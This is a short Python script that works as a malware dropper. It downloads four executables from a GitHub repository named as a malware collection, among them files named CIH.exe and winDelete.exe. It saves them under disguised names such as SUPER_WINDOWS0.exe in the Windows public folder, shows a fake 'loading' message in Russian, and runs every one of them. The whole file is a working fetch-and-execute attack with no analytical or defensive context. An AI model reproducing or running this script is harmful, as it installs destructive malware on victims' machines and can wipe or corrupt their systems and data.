import requests
import urllib.request
import time
import os

urls = ['https://github.com/Zusyaku/Malware-Collection-Part-2/raw/main/666/666.exe',
'https://github.com/Zusyaku/Malware-Collection-Part-2/raw/main/000%20virus/000.exe',
'https://github.com/Zusyaku/Malware-Collection-Part-2/raw/main/CIH%20(Win32)/CIH.exe',
'https://github.com/Zusyaku/Malware-Collection-Part-2/raw/main/winDelete-New/winDelete.exe']

i = 0                             

for _ in urls:
    print("Загрузка .")
    urllib.request.urlretrieve(_, f'C:\\Users\\Public\\SUPER_WINDOWS{i}.exe')
    time.sleep(2)
    i += 1
    os.system('cls')
    print("Загрузка ..")

time.sleep(2)
print("OK")

 
os.system('C:\\Users\\Public\\SUPER_WINDOWS0.exe')
os.system('C:\\Users\\Public\\SUPER_WINDOWS1.exe')
os.system('C:\\Users\\Public\\SUPER_WINDOWS2.exe')
os.system('C:\\Users\\Public\\SUPER_WINDOWS3.exe')
